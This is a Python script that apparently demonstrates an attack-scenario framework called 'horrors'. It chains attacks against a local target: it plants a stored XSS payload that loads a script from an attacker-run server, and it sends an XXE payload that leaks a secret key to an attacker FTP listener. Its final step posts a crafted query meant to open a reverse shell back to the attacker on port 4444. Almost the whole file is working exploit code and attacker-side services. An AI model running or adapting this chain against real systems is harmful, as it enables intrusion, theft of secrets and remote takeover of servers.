#!/usr/bin/env python3

from horrors import (
    scenarios,
    services,
    events,
)


class PlantXSS(scenarios.Scene):

    async def task(self):
        """Post XSS payload"""

        await self.http_post(
            'http://{rhost}:{rport}/test/'.format(**self.context),
            'field=<script src=http://{lhost}:{lport_http}/xss.js></script>'.format(**self.context)
        )


class GetNewAccount(scenarios.Scene):

    next_event = 'userid'

    async def task(self):
        """Wait for `xss` state triggered when request path contains `xss.js`"""

        result = await self.http_get(
            'http://{rhost}:{rport}/userid/{username}'.format(**self.context)
        )
        self.context['userid'] = result['content'].decode()


class SendXXE(scenarios.Scene):

    async def task(self):
        """Post XXE payload using value `userid` stored in local context"""
        
        await self.http_post(
            'http://{rhost}:{rport}/xml-import/'.format(**self.context),
            '<?xml version="1.0" ?><something evil="{userid}">ftp://{lhost}:{lport_ftp}</something>'.format(**self.context)
        )


class ReverseShell(scenarios.Scene):

    async def task(self):
        """Wait for `xxe` state triggered when remote client connects via FTP and sends the secret"""

        await self.http_post(
            'http://{rhost}:{rport}/query/'.format(**self.context),
            'secret={secret}&query=DROP+TABLE+IF+EXISTS+[...]{lhost}+{lport_reverse}'.format(**self.context)
        )


if __name__ == "__main__":
    context = {
        'rhost': '127.0.0.1',
        'rport': 8008,
        'lhost': '127.0.0.1',
        'lport_http': 8888,
        'lport_reverse': 4444,
        'lport_ftp': 2121,
        'username': 'evil',
    }

    httpd = services.HTTPStatic()
    httpd.add_route('/', 'This is home page...')
    httpd.add_route('/xss.js', open('xss.js').read().format(context=context))
    httpd.add_route('/timestamp', services.HTTPStatic.timestamp)
    httpd.add_event('xss', when=events.PathContains('xss.js'))

    ftpd = services.FTPReader()
    ftpd.add_event('xxe', when=events.DataMatch(r'.+SecretKey=(.+);', in_context='secret'))

    story = scenarios.Scenario(keep_running=False, context=context)
    story.add_service(httpd)
    story.add_service(ftpd)
    story.add_scene(PlantXSS)
    story.add_scene(GetNewAccount, when='xss')
    story.add_scene(SendXXE, when='userid')
    story.add_scene(ReverseShell, when='xxe')
    story.play()
